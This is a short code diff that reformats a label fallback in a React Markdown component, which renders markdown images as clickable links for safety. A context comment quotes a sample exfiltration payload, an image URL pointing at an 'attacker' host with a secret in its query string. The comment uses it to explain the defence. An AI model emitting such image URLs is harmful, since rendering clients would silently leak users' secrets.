@@ -75,7 +75,8 @@ export const Markdown = memo(function Markdown({
         // `![](http://attacker/?d=<secret>)` would fetch on render = a silent, no-click
         // exfil beacon. As a link, egress needs an explicit user click.
         const href = typeof src === "string" ? src : undefined;
-        const label = typeof alt === "string" && alt.trim() ? alt.trim() : "图片链接";
+        const label =
+          typeof alt === "string" && alt.trim() ? alt.trim() : "图片链接";
         if (!href) return <>{label}</>;
         return (
           <a href={href} target="_blank" rel="noreferrer">
